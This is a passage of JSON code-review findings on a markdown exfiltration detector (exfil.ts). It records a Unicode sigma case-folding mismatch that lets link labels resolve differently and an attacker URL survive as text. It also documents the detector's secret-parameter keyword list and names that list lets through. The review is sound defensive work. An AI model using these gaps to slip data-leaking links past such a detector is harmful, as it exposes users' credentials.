    "problem": "CommonMark matches link labels after context-insensitive Unicode case folding; normaliseLabel uses String.prototype.toLowerCase, which is context-sensitive. \"ΟΣ\".toLowerCase() is \"ος\" (U+03C2) where case folding gives \"οσ\", so `![οσ]` resolves against `[ΟΣ]: URL` under a folding renderer and not here.",
    "impact": "Not reproduced with a fetching renderer. marked uses toLowerCase too and agrees with the detector on every sigma spelling driven (s13-s16, u3, u4); the only residue is textual — in u4FinalSigmaRev the attacker URL survives all four boundaries as plain text with no renderer fetching it. Reachable only against a strictly conformant folding renderer, which is outside the measured threat model.",
    "suggested_fix": "None under this dispatch. If a later round widens the renderer set beyond marked, switch to case folding and apply it on both the definition and use sides in the same change, per the rule already recorded at exfil.ts:654.",
    "evidence": "T82-escape.log rows s13SigmaUseMedial (0 findings, no <img>) and s14SigmaUseFinal (1 finding); T82-dup.log row u4FinalSigmaRev in textResidue. Code points: \"ΟΣ\".toLowerCase() -> U+03BF U+03C2, \"Σ\".toLowerCase() -> U+03C3; \"xΟΣy\".toLowerCase().slice(1,3) != \"xΟΣy\".slice(1,3).toLowerCase().",
    "confidence": "high",
    "blocking_merge": false
  },
  {
    "id": "F-004",
    "global_id": "T82#F-004",
    "reviewer": "T82-independent-verifier",
    "severity": "minor",
    "file": "src/security/detect/exfil.ts",
    "symbol": "isSensitiveDestination",
    "problem": "The inline-link sensitivity keyword list flags token, api_key, apikey, secret, password and access_token but releases session, sessionid, pwd, auth, key and sig.",
    "impact": "Bounded and not zero-click: a link requires a click, and the image path is deny-by-default for any external host regardless of parameter name (verified: ![a](...?session=X) -> 1 finding). This widens a click-gated surface only.",
    "suggested_fix": "None under this dispatch; it is a keyword-list completeness question on a click-gated surface, which is the shape the recorded scope decision closes.",
    "evidence": "16-key sweep through detectExfil: [[\"token\",1],[\"api_key\",1],[\"apikey\",1],[\"session\",0],[\"sessionid\",0],[\"secret\",1],[\"password\",1],[\"pwd\",0],[\"auth\",0],[\"access_token\",1],[\"key\",0],[\"sig\",0],[\"code\",0],[\"ctx\",0],[\"data\",0],[\"q\",0]]; urlSecretLink row in .metaproject/data/gdctx/raw/T82-ac5.log.",
    "confidence": "high",
    "blocking_merge": false
  },
  {
    "id": "F-005",
    "global_id": "T82#F-005",
    "reviewer": "T82-independent-verifier",
    "severity": "info",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-cost.ts",
    "symbol": "manyDefsThenBangRun",
    "problem": "My own ladder reports growth exponent 5.73 for this shape. It is an artifact: the builder caps the definition block at 4000 entries, so bytes move only 588893 -> 700893 (x1.19) across the four points while the `![` run moves x8, and the exponent is computed against bytes.",
    "impact": "None on the verdict. Cost moves 7.6 -> 20.6 ms, linear in the dial that actually changed, and every point is three orders of magnitude under the budget. Recorded so a later round does not read the row as superlinearity in the detector.",
    "suggested_fix": "None; the probe is a review artifact, not shipped code.",
    "evidence": ".metaproject/data/gdctx/raw/T82-cost-ladder.log, superLinear: [\"manyDefsThenBangRun\"], row measured 588893:7.6ms 604893:8.6ms 636893:13ms 700893:20.6ms.",
    "confidence": "high",
    "blocking_merge": false
  }
]
```
